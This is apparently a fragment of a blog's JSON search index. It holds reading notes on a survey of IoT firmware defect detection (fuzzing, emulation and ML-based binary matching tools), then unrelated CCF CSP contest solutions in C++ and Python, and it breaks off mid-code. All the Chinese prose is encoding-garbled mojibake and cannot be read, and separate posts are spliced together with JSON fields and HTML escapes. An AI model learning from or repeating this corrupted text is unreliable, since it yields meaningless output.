IoTFuzzer[57]åŸºäºç§»åŠ¨åº”ç”¨ç¨‹åºä¸çœŸå®ç»ˆç«¯è®¾å¤‡å¼€å‘äº†ä¸€ä¸ªæ£€æµ‹å›ºä»¶ç¨‹åºä¸­å†…å­˜æŸåç¼ºé™·çš„é»‘ç›’æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚ ä¸‹é¢å‡ ä¸ªæ˜¯é’ˆå¯¹é…ç½®ç¼ºé™·çš„\nYu a n ç­‰äºº[59]æå‡ºä¸€ä¸ªä¸éœ€è¦æºä»£ç çš„åœ¨çº¿é»‘ç›’æµ‹è¯•å·¥å…· CODE æ¥å¯¹ä½¿ç”¨æœ€ä¸ºé¢‘ç¹çš„é…ç½®è¿›è¡Œç¼ºé™·æ£€æµ‹ã€‚ Su å’Œ Attariyan ç­‰äºº[60]é€šè¿‡åœ¨ Linux å†…æ ¸çº§å¯¹ä¸é…ç½®ç›¸å…³çš„åŠ¨ä½œçš„è¾“å…¥å’Œè¾“å‡ºè¿›è¡Œè·Ÿè¸ª, æ¨æ–­å‡ºé…ç½®é”™è¯¯å‘ç”Ÿçš„å› æœå…³ç³», å¹¶å®ç°äº†å·¥å…· AutoBashã€‚ Attariyan ç­‰äºº[61]é€šè¿‡å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ’æ¡©, åœ¨ç¨‹åºè¿è¡Œæ—¶é€šè¿‡æ§åˆ¶æµå’Œæ•°æ®æµè·å–ä¾èµ–å…³ç³», é€šè¿‡ä¾èµ–å…³ç³»å°†å¼‚å¸¸è¡Œä¸ºå®šä½åˆ°ç‰¹å®šçš„é…ç½®é¡¹ä¸­, å®ç°äº†åä¸º ConfAid çš„åŠ¨æ€é…ç½®ç¼ºé™·æ£€æµ‹å·¥å…·ã€‚ Zhang ç­‰äºº[62]æå‡ºäº†ä¸€ä¸ªé™æ€åˆ†æå’ŒåŠ¨æ€åˆ†æç›¸ç»“åˆæ¥è¯Šæ–­å•ä¸ªé…ç½®ç¼ºé™·çš„å·¥å…· ConfDiagnoserã€‚ åŸºäºæ¨¡æ‹Ÿæ‰§è¡Œç¯å¢ƒçš„æ¨¡ç³Šæµ‹è¯• å¯¹åŸºäº linux çš„å›ºä»¶ï¼š\nZaddach ç­‰äºº[63]æå‡ºäº†ä¸€ä¸ªæ¡†æ¶ Avatar, é€šè¿‡å°†ä»¿çœŸå™¨çš„æ‰§è¡Œä¸å®é™…ç¡¬ä»¶åè°ƒåœ¨ä¸€èµ·, å®ç°äº†å¯¹åµŒå…¥å¼è®¾å¤‡çš„å¤æ‚åŠ¨æ€åˆ†æã€‚ Chen ç­‰äºº[65]å®ç°äº†ç¬¬ä¸€ä¸ªå¯¹åŸºäº Linux çš„å•†ç”¨ç‰©è”ç½‘è®¾å¤‡å›ºä»¶åœ¨æ¨¡æ‹Ÿå™¨ä¸­è¿›è¡Œä»¿çœŸã€è‡ªåŠ¨åŒ–åˆ†æçš„ç³»ç»Ÿ FIRMADYNE, æ­¤å·¥ä½œå¯ä»¥ä»¿çœŸ Linux ç³»ç»Ÿ, å¹¶å®Œå…¨è„±ç¦»ç¡¬ä»¶è¿›è¡Œä»¿çœŸã€‚ Firm-AFL[66]åŸºäº FIRMADYNE å®ç°äº†å¯¹åŸºäº Linux çš„ç‰©è”ç½‘å›ºä»¶çš„é«˜æ€§èƒ½ç°ç›’æ¨¡ç³Šæµ‹è¯•, è¿™æ˜¯ç¬¬ä¸€ä¸ªé’ˆå¯¹å›ºä»¶çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•ç³»ç»Ÿ, è€Œä¸”æé«˜äº†å›ºä»¶æ¨¡æ‹Ÿæ‰§è¡Œçš„æ•ˆç‡ã€‚ å¯¹äºå¤„ç†å¤–è®¾è¾“å…¥ï¼š\nP2IM åŸºäºå¤–è®¾æ¥å£æŠ½è±¡å»ºæ¨¡ï¼Œä½†æ˜¯æ— æ³•å¤„ç†å›ºä»¶å¯¹å†…å­˜çš„ç›´æ¥è®¿é—® DICE é€šè¿‡è¯†åˆ«å›ºä»¶ä¸­çš„ DMA è¾“å…¥è¾“å‡ºé€šé“å¹¶åŠ¨æ€åˆ›å»ºç¼“å†²åŒºæ¥è§£å†³å›ºä»¶å¯¹å†…å­˜çš„ç›´æ¥è®¿é—® Laelaps ä½¿ç”¨ç¬¦å·æ‰§è¡Œæ¥ç”Ÿæˆå¤–è®¾è¾“å…¥ ä»¥ä¸Šçš„è§£å†³æ–¹æ¡ˆæ”¯æŒçš„å¤–è®¾ç±»å‹å’Œè¾“å…¥è¾“å‡ºç±»å‹æœ‰é™ HALucinatior é€šè¿‡æ›¿æ¢å›ºä»¶ç¡¬ä»¶æŠ½è±¡å±‚ä½¿å…¶ä¸ä¾èµ–äºå…·ä½“ç¡¬ä»¶ã€‚ PCHECK æ˜¯é’ˆå¯¹é…ç½®ç¼ºé™·çš„æ¨¡ç³Šæµ‹è¯•è½¯ä»¶ æ¨¡ç³Šæµ‹è¯•çš„ç—›ç‚¹åœ¨äºä¸èƒ½å®Œç¾çš„æ‰˜ç®¡å›ºä»¶â€”â€”æ²¡æœ‰å®Œç¾çš„æ¨¡æ‹Ÿå™¨ï¼Œæœªæ¥ç ”ç©¶é€šè¿‡å…¶ä»–æ–¹æ³•æ¥å¼¥è¡¥æ¨¡æ‹Ÿå™¨çš„ä¸è¶³â€”â€”æ‰“è¡¥ä¸ã€‚ ç¨‹åºéªŒè¯æŠ€æœ¯ ç¨‹åºéªŒè¯æŠ€æœ¯æ˜¯æŒ‡ä»¥æ•°å­¦å’Œé€»è¾‘ä¸ºåŸºç¡€, å¯¹ç³»ç»Ÿè¿›è¡Œè¯´æ˜ã€è®¾è®¡å’ŒéªŒè¯, é€šè¿‡å½¢å¼è§„çº¦æ¥æè¿°ç³»ç»Ÿçš„è¡Œä¸ºæˆ–è€…ç³»ç»Ÿåº”è¯¥æ»¡è¶³çš„æ€§è´¨, é‡‡ç”¨å½¢å¼åŒ–éªŒè¯æ¥éªŒè¯ç³»ç»Ÿæ˜¯å¦æ»¡è¶³éœ€æ±‚å’Œå…·å¤‡è¿™äº›æ€§è´¨, å³æ˜¯å¦æ»¡è¶³è§„çº¦ ä¸æ„Ÿå…´è¶£ï¼Œä¸çœ‹ã€‚\nåŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ³• ç°æœ‰çš„åŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ³•å¤§å¤šé€šè¿‡é™æ€åˆ†ææˆ–è€…åŠ¨æ€æ‰§è¡Œæ¥æå–ç¨‹åºç‰¹å¾, ä½¿ç”¨ä¸€äº›æœºå™¨å­¦ä¹ ç®—æ³•æ¥å­¦ä¹ å·²æœ‰çš„ç¼ºé™·ç‰¹å¾, å¹¶åœ¨ç¨‹åºä¸­æŸ¥æ‰¾å·²çŸ¥ç¼ºé™·ã€‚\nä¸Šä¸‹æ–‡æ— å…³çš„å‡½æ•°åŒ¹é… Feng ç­‰äºº[79]æå‡ºä¸€ä¸ªåŸºäºæ§åˆ¶æµç¨‹å›¾ (CFG) çš„ç¼ºé™·æœç´¢å¼•æ“ Geniusã€‚åˆ›æ–°åœ¨äºå°† CFG è½¬åŒ–æˆäº†æ•°å­—ç‰¹å¾å‘é‡ï¼Œé™ä½äº†åŒ¹é…çš„å¼€é”€ã€‚ åœ¨ä¹‹åçš„ç ”ç©¶ä¸­ Feng ç­‰äºº[80]è¿˜æå‡ºäº†ä¸€ç§åŸºäºä»åŸå§‹äºŒè¿›åˆ¶ç ä¸­æå–çš„æ¡ä»¶å…¬å¼ä½œä¸ºé«˜çº§è¯­ä¹‰ç‰¹å¾è¿›è¡Œä»£ç æœç´¢çš„æ–¹æ³•, å¹¶æ ¹æ®æ­¤å®ç°äº†å·¥å…· XMATCHã€‚ Xu ç­‰äºº[81]å¯¹ç¥ç»ç½‘ç»œè¿›è¡Œäº†ä¿®æ”¹, ä½¿å…¶å¯ä»¥å°†ä»å›ºä»¶ä¸­æå–çš„å±æ€§æ§åˆ¶æµå›¾ (attributed control flow graph, ACFG) è½¬åŒ–ä¸ºæ•°å­—ç‰¹å¾å‘é‡- åµŒå…¥å‘é‡ (embedding vectors), è¿™ä¸€æ–¹æ³•å¤§å¤§ç¼©å‡äº†åµŒå…¥å‘é‡çš„ç”Ÿæˆæ—¶é—´å’Œæ¨¡å‹çš„è®­ç»ƒæ—¶é—´ã€‚ Gao ç­‰äºº[82]æå‡ºäº†åŸºäºè¯­ä¹‰å­¦ä¹ çš„ä»£ç ç›¸ä¼¼æ€§è®¡ç®—å·¥å…· VulSeekerï¼Œä½œè€…ä»å›ºä»¶ä¸­æå–æ ‡è®°äº†çš„è¯­ä¹‰æµå›¾ (Labeled Semantic Flow Graph, LSFG), è¯¥å›¾åŒæ—¶åŒ…å«æ•°æ®æµå›¾å’Œæ§åˆ¶æµå›¾, å°†å›¾ä¸­çš„è¾¹æ ‡è®°ä¸º 0 å’Œ 1 åˆ†åˆ«æ¥è¡¨ç¤ºæ§åˆ¶æµå’Œæ•°æ®æµ, ä½œè€…ä½¿ç”¨ä» LSFG ä¸­æå–çš„åŸºæœ¬å—ç‰¹å¾ä½œä¸ºæ•°å­—å‘é‡, ä»¥æ­¤æ•°å­—å‘é‡ä¸ºè¾“å…¥é€šè¿‡è¯­ä¹‰æ„ŸçŸ¥çš„ DNN æ¨¡å‹è®¡ç®—, å¾—å‡ºå‡½æ•°çš„åµŒå…¥å‘é‡, é€šè¿‡è®¡ç®—ä¸¤ä¸ªå‡½æ•°çš„åµŒå…¥å‘é‡çš„ä½™å¼¦è·ç¦»æ¥è®¡ç®—ç›¸ä¼¼æ€§ã€‚ ä¸Šä¸‹æ–‡æ•æ„Ÿçš„å‡½æ•°åŒ¹é… ä¸Šä¸‹æ–‡æ— å…³çš„å‡½æ•°åŒ¹é…éš¾ä»¥è·¨è¶Šå¤šä¸ªå‡½æ•°è¿›è¡ŒåŒ¹é…ã€‚\nDavid ç­‰äºº[85]æå‡ºäº†åŸºäº Angr çš„é™æ€åˆ†æå·¥å…· FirmUP, ç”¨äºç¨‹åºåœ¨è¿‡ç¨‹é—´å±‚é¢è¿›è¡Œç¼ºé™·ç›¸ä¼¼æ€§åŒ¹é…ã€‚ äºŒè¿›åˆ¶å›ºä»¶æ–‡ä»¶åŒ¹é… Andrei ç­‰äºº[86]çš„å·¥ä½œæ”¶é›†äº†å¤§é‡çš„å›ºä»¶ç¨‹åº, è®¾è®¡äº†åˆ†å¸ƒå¼çš„æ¶æ„å¯¹å…¶è¿›è¡Œè§£åŒ…å’Œç®€å•çš„é™æ€åˆ†æ, å¹¶å®ç°äº†ä¸€ä¸ªå¼•æ“æ¥æ¯”è¾ƒå’Œç¡®å®šæ•°æ®é›†ä¸­æ‰€æœ‰å¯¹è±¡ä¹‹é—´çš„ç›¸ä¼¼æ€§ Chen ç­‰äºº[87]å‘ç°å›ºä»¶ä»£ç åœ¨ä¸åŒç¼–è¯‘ç¯å¢ƒã€ä¼˜åŒ–é€‰é¡¹ä¸‹ç¼–è¯‘å‡ºæ¥çš„äºŒè¿›åˆ¶ç ä¼šåŒ…å«ä¸€äº›\u0026quot;ç¼–è¯‘ä¸å˜æ€§\u0026quot;çš„å­—ç¬¦ä¸²ï¼Œä½œè€…åˆ©ç”¨æ·±åº¦å­¦ä¹ æ¥ç¼–ç å¯è¯»å­—ç¬¦ä¸²ï¼Œå¯¹å­—ç¬¦ä¸² hashï¼Œç”¨ hash æ¥è¿›è¡Œæ¯”å¯¹å’Œæ£€ç´¢ï¼ŒåŠ å¿«äº†é€Ÿåº¦ã€‚ Zou ç­‰äºº[88]é€šè¿‡å‘ç‰©è”ç½‘è®¾å¤‡å‘é€æŠ¥æ–‡æ¥è·å–ç‰©è”ç½‘è®¾å¤‡è¿”å›çš„åè®®æ ‡è¯­ä¿¡æ¯, ç”¨è‡ªç„¶è¯­è¨€å¤„ç†æ–¹æ³•æ¥è¿›è¡Œå¤„ç†, æœ€åè·å–è®¾å¤‡åˆ†ç±», ä»¥å‘ç°æ˜¯å¦åŒæœ‰ç¼ºé™·çš„è®¾å¤‡ä¸ºåŒä¸€å‚å•†ã€‚ï¼ˆä»€ä¹ˆé¬¼ï¼‰ è¿™éƒ¨åˆ†è¿™ä¸ªæ–‡ä»¶åŒ¹é…çš„æ€è·¯å¤§æ¦‚å°±æ˜¯ç”¨å·²çŸ¥æ¼æ´çš„æ–‡ä»¶å’Œæ™®é€šå›ºä»¶æ–‡ä»¶æå–ç‰¹å¾è¿›è¡Œæ¯”å¯¹ï¼Œå…³é”®ç‚¹åœ¨äºç‰¹å¾æå–ç®—æ³•å’Œæ¯”å¯¹ç®—æ³•èƒ½å¦æé«˜æ•ˆç‡ã€‚ åŸºäºæ¨¡æ¿çš„é…ç½®ç¼ºé™·æ£€æµ‹ Zhang ç­‰äºº[89]ä»ä¸€ç»„ç»™å®šçš„é…ç½®ä¸­åˆ©ç”¨æ•°æ®æŒ–æ˜æŠ€æœ¯å­¦ä¹ é…ç½®è§„åˆ™, ä»¥æ­¤è§„åˆ™æ¥æ£€æµ‹å…¶ä»–é…ç½®çš„æ­£ç¡®æ€§, å¹¶å®ç°äº†è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…· EnCoreã€‚ åŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ³•å¯ä»¥ç”¨æ¥æ£€æµ‹å›ºä»¶ä¸­çš„å·²çŸ¥ç¼ºé™·, ä¸”å¯ä»¥è·¨è¶Šä¸åŒå¹³å°è¿›è¡Œæ£€æµ‹ã€‚å¤§å¤šæ•°æ–¹æ³•éœ€è¦åŸºäºé™æ€åˆ†æå¾—å‡ºçš„ç»“æœè¿›è¡Œæœºå™¨å­¦ä¹ ï¼Œå› æ­¤æ•ˆæœçš„å¥½åå¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºç¨‹åºç‰¹å¾çš„æå–å’Œç›¸åº”çš„æœºå™¨å­¦ä¹ æ¨¡å‹çš„é€‰æ‹©ã€‚ å¦‚ä½•æ›´å¥½çš„æŠ½å–ç¨‹åºç‰¹å¾å’Œå¦‚ä½•å¯¹å›ºä»¶ç¨‹åºé€‰å–æœ‰æ•ˆçš„ç‰¹å¾å’Œé€‰æ‹©é«˜æ•ˆçš„åŒ¹é…æ–¹æ³•æ˜¯è¿™ç±»æ–¹æ³•çš„ä¸»è¦ç ”ç©¶é—®é¢˜ã€‚ä¸»è¦æ˜¯ä¸ºäº†æé«˜æ¼æ´è¯†åˆ«ï¼ˆæˆ–è€…æ˜¯æ¼æ´åŒ¹é…ï¼‰çš„ç²¾åº¦ï¼Œä¸Šä¸‹æ–‡æ•æ„Ÿæ¯”ä¸Šä¸‹æ–‡æ— å…³ç²¾åº¦è¦é«˜ï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•ï¼ˆæ–‡ç« ä¸­æåˆ°çš„é‚£å‡ ç¯‡æ–‡ç« ï¼‰ä½¿ç”¨çš„é™æ€åˆ†ææ–¹æ³•ä¸¢å¤±äº†ä¸€éƒ¨åˆ†è¯­ä¹‰ã€‚ ç¼ºé™·æ£€æµ‹è¾…åŠ©å·¥ä½œ è·å–æºç ï¼šè§£æ”¾å†›ä¿¡æ¯å·¥ç¨‹å¤§å­¦ææ¸…å®å›¢é˜Ÿåœ¨å›ºä»¶ä»£ç åç¼–è¯‘é¢†åŸŸå–å¾—äº†å¤§é‡æˆæœã€‚æ–‡çŒ®[90]è®¨è®ºäº†å›ºä»¶ä»£ç é€†å‘ä¸­çš„æŒ‡ä»¤å½’ä¸€åŒ–ã€æ§åˆ¶æµæ¢å¤ã€ä¸­æ–­å‘é‡è¡¨ç­‰å…³é”®é—®é¢˜, è®¾è®¡äº†é€†å‘å¹³å° amPro; æ–‡çŒ®[91]é’ˆå¯¹å›ºä»¶ä¸¥é‡ä¾èµ–ä¸­æ–­æå‡ºäº†åŸºäºä¸­æ–­å‘é‡è¡¨é‡æ„çš„å›ºä»¶ä»£ç åæ±‡ç¼–æŠ€æœ¯, å¤§å¤§æé«˜äº†åæ±‡ç¼–çš„ç²¾åº¦; æ–‡çŒ®[92]æå‡ºäº†åŠ¨é™æ€ä¸¤ä¸ªæ–¹é¢çš„å›ºä»¶ä»£ç æ§åˆ¶æµæ¢å¤ç®—æ³•, æé«˜äº†å›ºä»¶æ§åˆ¶æµæ¢å¤çš„å…¨é¢æ€§, ä¸ºåç»­çš„åˆ†ææä¾›äº†æœ‰åŠ›çš„æ”¯æŒ; æ–‡çŒ®[93]æå‡ºå¿«é€Ÿä½è¿ç®—æ–¹æ³•å’ŒåŒºé—´ç”Ÿæˆç®—æ³•, æé«˜äº†åœ¨å›ºä»¶åæ±‡ç¼–ä¸­è®¡ç®—å­—èŠ‚è¿ç®—å’Œä½è¿ç®—å–å€¼èŒƒå›´çš„æ•ˆç‡; æ–‡çŒ®[94]åˆ™åŸºäºåæ±‡ç¼–æŠ€æœ¯æå‡ºäº†å¯¹å›ºä»¶ä»£ç çš„å½¢å¼åŒ–éªŒè¯æ–¹æ³•å’Œå¤šè·¯å¾„å›ºä»¶æ¶æ„è¡Œä¸ºæ£€æµ‹æ–¹æ³•ã€‚ é¢å‘å›ºä»¶è§£ç çš„åˆ¤å®šé—®é¢˜, ä¸­ç§‘é™¢ä¿¡æ¯å·¥ç¨‹ç ”ç©¶æ‰€å­™åˆ©æ°‘å›¢é˜Ÿæå‡ºäº†åŸºäºåˆ†ç±»å›å½’æ ‘çš„å›ºä»¶è§£ç çŠ¶æ€æ£€æµ‹ç®—æ³•[95], å¯ä»¥è‡ªåŠ¨åŒ–åˆ†æå¤§é‡å›ºä»¶è§£ç çŠ¶æ€; é¢å‘å›ºä»¶ç³»ç»Ÿã€ç»“æ„ã€æ”¯æŒç¡¬ä»¶ä¸åŒç­‰é—®é¢˜, æå‡ºäº†åŸºäºè·å–è§„åˆ™çš„æ–¹æ³•æ¥è‡ªåŠ¨åŒ–å‘ç°å’Œæ ‡æ³¨ IoT è®¾å¤‡çš„ç±»å‹ã€ä¾›åº”å•†å’Œå‹å·[96], å’ŒåŸºäºè‡ªç„¶è¯­è¨€å¤„ç†æ¥åˆ†æç½‘é¡µå†…å®¹è¯†åˆ«è®¾å¤‡æŒ‡çº¹çš„æ–¹æ³•[97], æ–¹ä¾¿å…¶ä»–å­¦è€…è·å–å›ºä»¶è¯¦ç»†ä¿¡æ¯; è¿˜æå‡ºäº†åŸºäºè‡ªç„¶è¯­è¨€å¤„ç†åˆ†æç½‘ç»œä¸Šçš„ç¼ºé™·æŠ¥å‘Šæ¥ç†è§£ç‰©è”ç½‘è®¾å¤‡è¢«æ”»å‡»çš„åŸå› , å¹¶ååŠ©æŠµæŠ—æ”»å‡»[98]ã€‚æ–‡çŒ®[99]å¯¹å›ºä»¶è·å–ã€å›ºä»¶æ ¼å¼åˆ†æã€å›ºä»¶ç¨‹åºæå–ã€ç›®æ ‡ç¨‹åºåˆ†ææå–ã€ç¨‹åºè¡¨ç¤ºæŠ€æœ¯ã€æ‰§è¡Œä¿¡æ¯æ¢å¤æŠ€æœ¯ç­‰è¿›è¡Œäº†ç»¼è¿°ã€‚ æœªæ¥ç ”ç©¶æ–¹å‘ æ„é€ ä¸€ä¸ªæµ‹è¯•åŸºå‡†é›†, åŒ…å«ä¸åŒæ¶æ„ã€ä¸åŒç±»å‹çš„å›ºä»¶, ä¸”å›ºä»¶ä¸­å¯æ¤å…¥ä¸åŒç±»å‹çš„ç¼ºé™·ã€‚ å›ºä»¶ä»¿çœŸèƒ½åŠ›çš„æé«˜, è¦†ç›–æ›´å¤šçš„å¤–è®¾ç±»å‹å’Œç¡¬ä»¶æ¶æ„, æé«˜å¯¹å•†ç”¨ç‰©è”ç½‘è®¾å¤‡å›ºä»¶çš„ä»¿çœŸèƒ½åŠ›ã€‚ å¦‚ä½•æœ‰æ•ˆåˆ©ç”¨æ™ºèƒ½åŒ–æŠ€æœ¯, é€šè¿‡æŒ–æ˜å·²æœ‰æµ·é‡ä»£ç ä¸­çš„æ¼æ´ä¿¡æ¯ã€ç»“æ„ç‰¹å¾ã€è¯­ä¹‰ç‰¹å¾ã€ä»£ç ä¿®å¤ã€æ›´æ–°ä¿¡æ¯, å½¢æˆæ™ºèƒ½åŒ–çš„æ¼æ´é¢„æµ‹æ¨¡å‹, å®ç°è‡ªåŠ¨åŒ–ç”Ÿæˆæ¼æ´æ£€æµ‹è§„åˆ™, è¿›è€Œé«˜æ•ˆåœ°é¢„æµ‹æ½œåœ¨æ¼æ´, å¹¶ä¸ºåç»­ç›®æ ‡åˆ¶å¯¼çš„æ¨¡ç³Šæµ‹è¯•æä¾›åˆ¶å¯¼ç›®æ ‡ é¢å‘é…ç½®ç¼ºé™·æ£€æµ‹çš„æµ‹è¯•ç”¨ä¾‹ç”ŸæˆæŠ€æœ¯ å®šåˆ¶åŒ–ç¼ºé™·çš„æ£€æµ‹æ— éœ€å¯¹æ•´ä¸ªå›ºä»¶ç¨‹åºè¿›è¡Œé‡æ–°æµ‹è¯•, åªéœ€å¯¹å®šåˆ¶åŒ–éƒ¨åˆ†æµ‹è¯•å³å¯, ä½†ç›®å‰å°šæœªå‡ºç°è¿™ä¸€æ–¹å‘çš„ç ”ç©¶å·¥ä½œ, æœªæ¥å¯åœ¨è¿™ä¸€æ–¹å‘åšå‡ºæ‹“å±•ã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%E7%89%A9%E8%81%94%E7%BD%91%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/","summary":"ä¸­æ–‡è¯‘åï¼š ä½œè€…ï¼šå¼ å¼› å•ä½ï¼šè®¡ç®—æœºè½¯ä»¶æ–°æŠ€æœ¯å›½å®¶é‡ç‚¹å®éªŒå®¤ (å—äº¬å¤§å­¦) å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #ä¿¡æ¯å®‰å…¨å­¦æŠ¥ å…³é”®å­—ï¼š #ç»¼è¿° #åµŒå…¥å¼","title":"ç‰©è”ç½‘å›ºä»¶å®‰å…¨ç¼ºé™·æ£€æµ‹ç ”ç©¶è¿›å±•"},{"content":"æœŸæœ«é¢„æµ‹ä¹‹å®‰å…¨æŒ‡æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int n, sum = 0; cin\u0026gt;\u0026gt;n; while(n--){ int s, w; cin\u0026gt;\u0026gt;s\u0026gt;\u0026gt;w; sum += (s*w); } int ans = max(0, sum); cout\u0026lt;\u0026lt;ans; return 0; } 1 2 3 4 5 6 7 8 n = int(input()) sum = 0 for i in range(0, n): s, w = map(int, input().split()) sum = sum + s * w ans = max(0, sum) print(ans) æœŸæœ«é¢„æµ‹ä¹‹æœ€ä½³é˜ˆå€¼ å…³é”®ï¼šå·§å¦™çš„å°†è®¡æ•°è½¬å˜ä¸ºå‰ç¼€å’Œé—®é¢˜ é—®é¢˜çš„å…³é”®åœ¨äºå¦‚ä½•å¿«é€Ÿçš„ç»Ÿè®¡æ¯ä¸€ä¸ªé˜ˆå€¼é¢„æµ‹æ­£ç¡®çš„ä¸ªæ•°ï¼Ÿ Y æ€»çš„æ–¹æ³•æ˜¯é‡‡ç”¨å‰ç¼€å’Œçš„æ–¹æ³•æ¥ç»Ÿè®¡ä¸ªæ•°ï¼Œå¦‚ä½•å°†åˆ†æ•£çš„æ•°æ®è½¬å˜ä¸ºå¯ä»¥ç”¨å‰ç¼€å’Œçš„æ•°æ®å‘¢ï¼Œå°±æ˜¯æŒ‰ç…§é˜ˆå€¼å¯¹æ•°æ®è¿›è¡Œæ’åºã€‚è¿™æ ·çš„æ•ˆæœå°±æ˜¯é˜ˆå€¼ i é¢„æµ‹æ­£ç¡®çš„ä¸ªæ•°å°±æ˜¯åœ¨ i å‰çš„æ•°æ®çš„é¢„æµ‹ç»“æœä¸º 0 çš„ä¸ªæ•°åŠ ä¸Šåœ¨ i åæ•°æ®é¢„æµ‹ç»“æœä¸º 1 çš„ä¸ªæ•°ã€‚ é‚£ä¹ˆæˆ‘ä»¬ç»´æŠ¤ä¸¤ä¸ªå‰ç¼€å’Œæ•°ç»„ s1 å’Œ s0ï¼Œs1 [i]è¡¨ç¤º i å‰ï¼ˆåŒ…æ‹¬ iï¼‰çš„æ•°æ®ä¸­ 1 çš„ä¸ªæ•°ï¼Œs0 [i]åŒç†ã€‚é‚£ä¹ˆå¯¹äºæ•°æ® i å¯¹åº”çš„é˜ˆå€¼æ¥è¯´ï¼Œé¢„æµ‹æ­£ç¡®çš„ä¸ªæ•°å°±æ˜¯ s1 [m] - s1 [i - 1] + s0[i - 1]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define x first #define y second typedef pair\u0026lt;int, int\u0026gt;PII; const int N = 100010; PII p[N]; int s[2][N]; int main(){ int m; cin\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= m; i ++){ cin\u0026gt;\u0026gt;p[i].x\u0026gt;\u0026gt;p[i].y; } sort(p + 1, p + m + 1); // æ’åºï¼Œç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨å‰ç¼€å’Œç®—æ³• for(int i = 0; i \u0026lt; 2; i ++){ for(int j = 1; j \u0026lt;= m; j ++){ s[i][j] = s[i][j - 1] + (p[j].y == i); //ç»´æŠ¤å‰ç¼€å’Œæ•°ç»„ } } int res , cnt = -1; for(int i = 1; i \u0026lt;= m; i ++){ int t = s[0][i - 1] + s[1][m] - s[1][i - 1]; if(t \u0026gt;= cnt) cnt = t, res = p[i].x; while(i + 1 \u0026lt;= m \u0026amp;\u0026amp; p[i].x == p[i + 1].x) i++; //å› ä¸ºxï¼ˆé˜ˆå€¼ï¼‰æœ‰ç›¸åŒçš„å€¼ï¼Œé‚£ä¹ˆè®¡ç®—è¯¥é˜ˆå€¼çš„æ­£ç¡®é¢„æµ‹ä¸ªæ•°ï¼Œç”¨çš„åº”è¯¥æ˜¯æœ€åå‡ºç°çš„ä¸€ä¸ªé˜ˆå€¼å¯¹åº”çš„å‰ç¼€å’Œ } cout\u0026lt;\u0026lt;res; return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC21%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/","summary":"æœŸæœ«é¢„æµ‹ä¹‹å®‰å…¨æŒ‡æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int n, sum = 0; cin\u0026gt;\u0026gt;n; while(n--){ int s, w; cin\u0026gt;\u0026gt;s\u0026gt;\u0026gt;w; sum += (s*w); } int ans = max(0, sum); cout\u0026lt;\u0026lt;ans; return 0; } 1 2 3 4 5 6 7 8 n = int(input()) sum = 0 for i","title":"ç¬¬21æ¬¡CCFè®¡ç®—æœºè½¯ä»¶èƒ½åŠ›è®¤è¯"},{"content":"ç°åº¦ç›´æ–¹å›¾ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 500; const int L = 256; int gray_L[L]; int main(){ int n, m, l, tmp; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m\u0026gt;\u0026gt;l; for(int i = 0; i \u0026lt; n; i ++){ for(int j = 0; j \u0026lt; m; j ++){ cin\u0026gt;\u0026gt;tmp; gray_L[tmp]++; } } for(int i = 0; i \u0026lt; l; i ++){ cout\u0026lt;\u0026lt;gray_L[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; } return 0; } 1 2 3 4 5 6 7 8 9 10 11 n, m, l = map(int, input().split()) ans = [ 0 for i in range(0, 257)] for i in range(0, n): L = list(map(int, input().split())) for j in range(0, m): tmp = L[j]; ans[tmp] = ans[tmp] + 1 for i in range(0, l): print(str(ans[i]) + \u0026#34; \u0026#34;, end=\u0026#34;\u0026#34;) é¢†åŸŸå‡å€¼ è¿™ç§æ±‚å’Œåº”è¯¥ä¸€ä¸‹å­å°±æƒ³åˆ°æ˜¯å‰ç¼€å’Œï¼ˆå‰ç¼€çŸ©é˜µï¼‰ [[å‰ç¼€å’Œï¼ˆå‰ç¼€å’ŒçŸ©é˜µï¼‰]]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 610; int g[N][N]; int main(){ int n, l, r, t; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;l\u0026gt;\u0026gt;r\u0026gt;\u0026gt;t; for(int i = 1; i \u0026lt;= n; i++){ for(int j = 1; j \u0026lt;= n; j ++){ int tmp; cin\u0026gt;\u0026gt;tmp; g[i][j] = tmp + g[i-1][j] + g[i][j-1] - g[i-1][j-1]; } } int res = 0; for(int i = 1; i \u0026lt;= n; i++){ for(int j = 1; j \u0026lt;= n; j ++){ int x1 = max(1, i - r), y1 = max(1, j - r); int x2 